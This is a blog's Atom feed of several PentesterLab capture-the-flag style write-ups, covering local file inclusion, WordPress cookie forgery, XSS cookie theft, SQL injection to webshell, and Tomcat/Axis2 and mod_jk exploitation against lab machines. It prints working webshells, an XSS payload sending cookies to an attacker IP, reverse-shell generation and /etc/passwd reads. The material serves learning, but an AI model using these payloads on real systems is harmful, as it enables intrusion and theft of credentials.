<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pentesterlab | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/pentesterlab/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-22T15:36:02-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[pentesterlab-PHP-include]]></title>
    <link href="http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include/"/>
    <updated>2016-06-14T12:52:00-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Wfuzz</li>
<li>Netcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.188 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use Wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.188/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.79.188</code></p>

<p>looks like there is a php include vulnerability</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets confirm it:</p>

<p><code>http://192.168.79.188/index.php?page=fgfgfgf</code></p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><code>http://192.168.79.188/index.php?page=../../../../../../../../../../etc/passwd%00</code></p>

<p>(the reason why add %00 after /etc/passwd is php code will ad a suffix .php, so that we have to add a Null byte to get rid of it)</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried to exploit remote file inclide:</p>

<p><code>http://192.168.79.188/index.php?page=http://192.168.79.173/webshell.txt&amp;cmd=ifconfig</code></p>

<p>Doesn&rsquo;t work.</p>

<p>Exam the webpage, I find that I can upload pdf file to the server. I tried just rename webshell.txt to webshell.pdf and the server doesn&rsquo;t accpet it. I guess the server will valid the pdf file format. So I create a craft pdf file:</p>

<pre><code class="php webshell.pdf">%PDF-1.4
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></pre>

<p>Upload it. Works.</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now try to visit after log in.</p>

<p>Try to verify the webshell:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks good</p>

<p>set up netcat listener on my kali and run the command on server:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>and get the shell:</p>

<p><img src="/images/blog/pentesterlab/phpinclude/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2008-1930 Wordpress 2.5 Cookie Integrity Protection Vulnerability]]></title>
    <link href="http://wg135.github.io/blog/2016/04/18/cve-2008-1930/"/>
    <updated>2016-04-18T16:53:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/18/cve-2008-1930</id>
    <content type="html"><![CDATA[<p><em>Wake up..Neo.. The Matrix HAS YOU</em> &mdash;&ndash;the Matrix</p>

<p>From <a href="https://pentesterlab.com/exercises/cve-2008-1930/course">pentesterlab</a>
This course details the exploitation of an issue in the cookies integrity mechanism of Wordpress. This issue was found in 2008 and allowed an attacker to gain administrator access to a wordpress instance if user registration is enabled.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Cookie Manager+</li>
<li>wfuzz</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, we use admin1 and password pentesterlab to login as user admin1</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>here we can use Cookie Manager+ to view the cookies we got.</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>modify cookie from <code>admin1%7C1461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code> to <code>admin%7C11461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code>, reload the page, now we are in admin&rsquo;s session.</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
    <link href="http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file/"/>
    <updated>2016-04-12T13:19:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p><em>It is time for you to act, LORD; your law is being broken.</em> &mdash; Psalm 119:126</p>

<p>This course details the exploitation of a Cross-Site Scripting in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server using SQL injections.</p>

<p>From Pentesterlab:</p>

<p>The attack is divided into 2 steps:</p>

<ol>
<li>Detection and exploitation of Cross-Site Scripting vulnerabilities: in this part, you will learn how to detect and exploit Cross-Site Scripting vulnerabilities.</li>
<li>Access to the administration pages, then find and exploit a SQL injection to gain code execution. The last step in which you will access the operating system and run command.</li>
</ol>


<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>Zap</li>
<li>Firebug</li>
<li>Cookie Manager+</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>Indetify XSS vuln and scan the website pages. &mdash;-Zap</li>
<li>Embeded script into page. &mdash;- Firebug</li>
<li>Deploy web shell.</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Also I lauched zap to scan the website, try to find interesting things such as injection points and hidden pages. two things are very interesting. First of all, zap raises a flag for a xss vulnerability:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>it looks like zap has already inject <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> into that page. If you visit the link &ldquo;<a href="http://192.168.79.168/post.php?id=1">http://192.168.79.168/post.php?id=1</a>&rdquo;, it will pop up an alert 1.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>We can use this xss vulnerability to steal admin&rsquo;s cookie.</p>

<p>keep going &hellip;</p>

<p>Before stealing admin&rsquo;s cookie, we have to setup listener on attacking machine,</p>

<p><code>python -m SimpleHTTPServer 4444</code></p>

<p>use this payload instead of alert(1) in the xss (use firebug to edit the html)</p>

<p><code>&lt;script&gt;document.write('&lt;img src="http://192.168.79.156:4444/?'+document.cookie+'  "/&gt;');&lt;/script&gt;</code></p>

<p>192.168.79.156 is attacker&rsquo;s machine.</p>

<p>Now we got the cookie.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>put the cookie in Cookie Manager+</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <code>http://192.168.79.168/admin/</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s explore the admin&rsquo;s pages. First, click <code>edit</code>, it will go to <code>http://192.168.79.168/admin/edit.php?id=2</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>now looks like the url contains injection point, lets try to use single quote:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2'</code></p>

<p>we get error message:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we know that the web sites' absolute path is &ldquo;/var/www/&rdquo;</p>

<p>From <a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">pentesterlab</a></p>

<p>Exploiting SQL injection using UNION follows the steps below:</p>

<p> 1   Find the number of columns to perform the UNION
 2   Find what columns are echoed in the page
 3   Retrieve information from the database meta-tables
 4   Retrieve information from other tables/databases</p>

<p>In order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query. Unless you have the source code of the application, you will have to guess this number.</p>

<p>There are two methods to get this information:</p>

<p>1   using UNION SELECT and increase the number of columns;
2   using ORDER BY statement.</p>

<p>Here we use order by statement to get the number of columns</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2 order by 4 --</code> good
<code>http://192.168.79.168/admin/edit.php?id=2 order by 5 --</code> error</p>

<p>Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.</p>

<p>get DB version:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,@@version,4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>get /etc/passwd file:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file("/etc/passwd"),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>get user info:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,user(),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>since the user is root, now we can deploy a webshell&hellip;</p>

<p>use <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> to create evil.php under css folder. Encode <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> part.</p>

<p>Now we can see that the evil.php is created successfully.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>Cool&hellip; Lets write webshell now</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>of course. encode <code>0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>Now run command:</p>

<p><code>http://192.168.79.168/css/webshell.php?c=cat /etc/passwd</code></p>

<p>encode <code>/etc/passwd</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/tumblr_nqnzzzQJGq1rbc9h1o1_500.gif" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Axis2 Web service and Tomcat Manager ]]></title>
    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab/"/>
    <updated>2016-04-05T14:46:46-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab</id>
    <content type="html"><![CDATA[<p><em>When you engage in actual fighting, if victory is long in coming, then men&rsquo;s weapons will grow dull and their ardor will be damped. If you lay siege to a town, you will exhaust your strength.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server. &mdash;Pentesterlab</p>

<p>Difficluty: 3/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>nc</li>
<li>msfvenom</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>generate webshell. &mdash;msfvenom</li>
<li>backdoor. &mdash;nc</li>
<li>webshell. &mdash;Car.arr</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/axis2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find that the server host a web service using Axis2.</p>

<p>In order to test is the web server using Tomcat, we can try to visit a non-existing web page and watch the 404 error page.</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find the server uses Tomcat and we get the version of the Tomcat. Keep going&hellip;</p>

<p>Lets check the path axis2/ , we get the page:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>get the list of the available services by visiting the page <code>http://192.168.79.168/axis2/services/listServices</code> or click the serices link</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The WSDL information can be accessed by clicking the service&rsquo;s name in the listServices page or directly using the following URL: <code>http://192.168.79.168/axis2/services/ProxyService?wsdl</code>.</p>

<p>We can see that <code>get</code> operation is defined in WSDL</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Axis2 provides an easy way to call Web services, you just need to follow the pattern <a href="http://">http://</a>[WS_URL]/method?parameters</p>

<h4>Attack</h4>

<h4>Easy way</h4>

<p>Get Tomcat manager configuration to get login credentials.
In Debian Linux, the tomcat configuration file tomcat-users.xml has default location: /etc/tomcat6/tomcat-users.xml</p>

<p>So we can try:</p>

<pre><code>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml
</code></pre>

<p>Then we get the Tomcat manager&rsquo;s credentials:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>the tomcat manager-gui login password can be found: username: manager password: !mp0ss!bl32gu355</p>

<p>Then login tomcat manager from the URL <a href="http://192.168.79.168/manager/html">http://192.168.79.168/manager/html</a> to upload and deploy JSP webshell in WAR file.</p>

<h4>deploy webshell</h4>

<p>Generate webshell:</p>

<pre><code>$ mkdir webshell
$ cd webshell
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.156 LPORT=4444 -f raw &gt; sh4.jsp
$ jar -cvf ../webshell.war *
</code></pre>

<p>Then uplpad the websehll.war to manager page</p>

<p>in Kali setup nc:</p>

<p><code>nc -nlvp 4444</code></p>

<p>go to <code>http://192.168.79.168/webshell/sh4.jsp</code></p>

<p>then you will get the shell:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<h4>&lsquo;Hard&rsquo; way</h4>

<p>In Debian Linux, the axis2 configuration file axis2.xml has default location: <code>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>so we can visit this page by using,</p>

<p><code>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>from axis2.xml, we find the credential is admin/axis2</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Then login axis2 admin page from the URL <code>http://192.168.79.168/axis2/axis2-admin/</code></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to upload webshell.war we used in last method.</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it doesn&rsquo;t support the war file format. WTF, okay, try harder.</p>

<p>After google search, I found a webshell for axis2,  called <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">Cat.arr</a></p>

<p>Download it and upload it to the server, it requres host IP and port number:</p>

<pre><code>192.168.79.168/axis2/services/Cat/shell?host=192.168.79.156&amp;port=6666
</code></pre>

<p><img src="/images/blog/pentesterlab/axis2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Oh&hellip;..</p>

<p><img src="/images/blog/pentesterlab/axis2/gameover.jpeg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--cve-2007-1860]]></title>
    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860/"/>
    <updated>2016-04-05T12:04:47-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860</id>
    <content type="html"><![CDATA[<p><em>By means of these seven considerations I can forecast victory or defeat.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat&rsquo;s manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. &mdash;Pentesterlab</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>NC</li>
<li>Firebug</li>
<li>webshell</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
<li>Check http headers. &mdash;&ndash; NC</li>
<li>Exploit and upload webshell. &mdash;- Firebug</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>By checking the application HTTP headers with nc, I can also get Apache service version.</p>

<pre><code>GET / HTTP/1.1
Host: 192.168.79.168
</code></pre>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<p>First of all, we need to figure out the architecture of Tomcat and Apache. Read <a href="https://pentesterlab.com/exercises/cve-2007-1860/course">here</a></p>

<p>If we try to visit a non-exist page, we will receive 404 error like that:</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Based on the result, we know the http request is processed by Apache.</p>

<p>If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Then we know that the http request is processed by Tomcat through Apache.</p>

<p>Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described <a href="http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E">advisory</a></p>

<p>From pentesterlab,</p>

<p><em>If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using <code>modjk</code>).</em></p>

<p>Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)</p>

<p><code>http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html</code></p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>The credentials are one of the default ones. In this exerciese, the admin didn&rsquo;t change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we need to create a webshell and upload it to the Tomcat.</p>

<h4>Deploy a webshell</h4>

<p>webshell (from pentesterlab, you may generate it using msfvenom)</p>

<p>```jsp index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
&lt;%
   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
   String output = &ldquo;&rdquo;;
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%></p>

<pre><%=output %></pre>


<pre><code>
now we have to  pack the webshell
</code></pre>

<p>$ mkdir webshell
$ cp index.jsp webshell</p>

<p>$ cd webshell
$ jar -cvf ../webshell.war *</p>

<p>```</p>

<p>webshell <code>webshell.war</code> is ready to fire.</p>

<h4>Upload webshell</h4>

<p>We can use the form to upload war file:
<img src="/images/blog/pentesterlab/cve_2007_1860/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>change the location to :</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>After successful uploading webshell, it will show in the Tomcat manager:</p>

<p><img src="/images/blog/pentesterlab/cve_2007_1860/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now enjoy the webshell by accessing</p>

<p><code>http://192.168.79.168/examples/%252e%252e/webshell/</code></p>

<p> <img src="/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>

<p><img src="/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
